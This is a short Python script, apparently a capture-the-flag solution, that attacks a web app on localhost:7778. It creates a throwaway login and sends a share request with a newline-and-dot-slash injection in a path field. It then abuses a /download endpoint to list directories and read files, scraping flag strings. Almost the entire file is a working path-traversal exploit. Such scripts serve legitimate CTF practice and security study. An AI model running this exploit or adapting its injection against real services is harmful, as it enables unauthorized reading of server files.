import requests as req
import json
import re
import hashlib, uuid
import sys

url = "http://localhost:7778"

sess = req.Session()
# proxy = {"http": "http://127.0.0.1:8080"}
proxy = {}

REGEX = r"[A-Z0-9]{31}="


def login():
    global sess
    username = hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()
    res = sess.post(
        f"{url}/login",
        data={"username": f"{username}", "password": "quan"},
        proxies=proxy,
    )
    return username


def access(token):
    global sess
    res = sess.get(f"{url}{token}")


def share(username):
    global sess
    res = sess.post(
        f"{url}/share",
        data=f'{{"u": "{username}", "l": "{username}/\u000a./", "m": "ok"}}',
        proxies=proxy,
    )
    token = res.text.split('<a href="')[1].split('">')[0]
    access(token)


def download():
    global sess
    res = sess.get(f"{url}/download", params={"file": "./"}, proxies=proxy)
    return json.loads(res.text)


def get_flag(file):
    res = sess.get(f"{url}/download", params={"file": file}, proxies=proxy)
    sub_file = file + "/" + json.loads(res.text)[0]
    res2 = sess.get(f"{url}/download", params={"file": sub_file}, proxies=proxy)
    x = re.findall(REGEX, res2.text)
    # print(x)
    if len(x) > 0:
        return x[0]


uname = login()
token = share(uname)
files = download()

flags = []
for file in files:
    x = get_flag(file)
    if x:
        flags.append(x)

print(flags)
